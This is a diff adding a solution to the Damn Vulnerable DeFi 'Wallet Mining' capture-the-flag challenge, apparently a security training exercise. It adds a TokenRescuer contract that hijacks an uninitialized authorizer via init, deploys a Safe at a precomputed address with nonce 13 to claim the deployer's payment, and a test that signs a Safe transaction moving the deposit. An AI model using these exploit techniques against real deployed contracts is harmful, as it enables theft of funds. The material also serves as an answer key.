@@ -25,6 +25,52 @@ import {
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
 
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
+
+contract TokenRescuer {
+    address immutable i_userDepositAddress;
+    DamnValuableToken immutable i_token;
+    address immutable i_userToSave;
+    address immutable i_ward;
+    AuthorizerUpgradeable immutable i_authorizer;
+    WalletDeployer immutable i_walletDeployer;
+    constructor(address userDepositAddress, DamnValuableToken token, address user, address ward, AuthorizerUpgradeable authorizer, WalletDeployer walletDeployer ){
+        i_userDepositAddress = userDepositAddress;
+        i_token = token;
+        i_userToSave = user;
+        i_ward = ward;
+        i_authorizer = authorizer;
+        i_walletDeployer = walletDeployer;
+    }
+
+    function rescue() external {
+        address[] memory _wards = new address[](1);
+        _wards[0] = address(this);
+        address[] memory _aims = new address[](1);
+        _aims[0] = i_userDepositAddress;
+        i_authorizer.init(_wards, _aims);
+        bool result = i_authorizer.can(address(this), _aims[0]);
+        console.log("Result: ", result);
+
+        address[] memory _owners = new address[](1);
+        _owners[0] = i_userToSave;
+        uint256 _threshold = 1;
+        address fallbackHandler = address(0);
+        address paymentToken = address(0);
+        uint256 payment = 0;
+        address payable paymentReceiver = payable(address(0));
+
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (_owners, _threshold, address(0), bytes(""), fallbackHandler, paymentToken, payment, paymentReceiver)
+        );
+        //nonce found out to be the GREAT 13
+        i_walletDeployer.drop(address(i_userDepositAddress), initializer, 13);
+        assert(i_token.balanceOf(address(this)) == i_walletDeployer.pay());
+        i_token.transfer(i_ward, i_token.balanceOf(address(this)));
+    }
+}
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
     address upgrader = makeAddr("upgrader");
@@ -156,7 +202,39 @@ contract WalletMiningChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_walletMining() public checkSolvedByPlayer {}
+    function test_walletMining() public checkSolvedByPlayer {
+         new TokenRescuer(USER_DEPOSIT_ADDRESS, token, user, ward, authorizer, walletDeployer).rescue();
+         assertEq(token.balanceOf(ward), walletDeployer.pay());
+
+        bytes32 messageHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash({
+            to: address(token),
+            value: 0,
+            data: abi.encodeCall(IERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT)),
+            operation: Enum.Operation.Call,
+            safeTxGas: 0,
+            baseGas: 0,
+            gasPrice: 0,
+            gasToken: address(0),
+            refundReceiver: payable(address(0)),
+            _nonce: Safe(payable(USER_DEPOSIT_ADDRESS)).nonce()
+        });
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, messageHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
+            address(token),
+            0,
+            abi.encodeCall(IERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT)),
+            Enum.Operation.Call,
+            0,
+            0,
+            0,
+            address(0),
+            payable(address(0)),
+            signature
+        );
+
+        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -188,3 +266,4 @@ contract WalletMiningChallenge is Test {
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
     }
 }
+
